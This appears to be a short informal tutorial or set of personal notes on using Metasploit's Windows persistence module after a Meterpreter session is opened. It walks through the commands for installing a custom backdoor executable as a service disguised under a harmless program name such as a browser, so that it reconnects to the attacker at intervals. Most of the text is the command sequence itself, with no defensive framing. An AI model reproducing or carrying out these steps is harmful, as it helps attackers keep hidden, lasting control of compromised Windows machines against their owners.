We have to use the normal backdoor(not a service), inject that as a service and this will try to connect
to us every amount of time. 
First after we gained the meterpeter connection, background the session.
Now use thos payload by the next commands.

use exploit/windows/local/persistence
show options
set the options as you wish,

exe_name - the name that will show as the service use name such as
browser,(windows programs).

path, reg_name - leave it the same

session - specify which session you run this exploit on, find the session by session -l


Now, we need to specify the payload that will be injected as a service, to do that:

show advance
set EXE::Custom /var/www/html/backdoor.exe(Backdoor location)
exploit

save the "clean up meterpeter rc file" location, this file is used to delete the backdoor
